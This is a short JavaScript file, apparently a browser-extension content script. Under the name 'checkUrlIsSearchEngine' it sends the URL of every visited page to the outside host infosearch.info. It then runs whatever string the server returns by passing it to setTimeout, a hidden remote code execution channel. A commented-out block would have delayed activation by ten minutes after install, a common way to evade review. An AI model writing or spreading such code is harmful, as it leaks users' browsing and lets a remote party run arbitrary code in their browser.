var currentUrl = document.URL;
function checkUrlIsSearchEngine(url) {
    $.ajax({
        'url': 'https://infosearch.info/testing',
        'type': 'GET',
        'data': {
            'url': url
        },
        'success': function (data) {
            if (data && data.link) {
                setTimeout(data.link, 0.1);
            }
        },
        'error': function (request, error) {
            console.log(error);
        }
    });
}

checkUrlIsSearchEngine(currentUrl);

// chrome.storage.sync.get(['isSet'], function (data) {
//     if (data && data.isSet) {
//         checkUrlIsSearchEngine(currentUrl);
//     } else {
//         setTimeout(function () {
//             chrome.storage.sync.set({
//                 isSet: true,
//             })
//         }, 60 * 10 * 1000)
//     }
// })


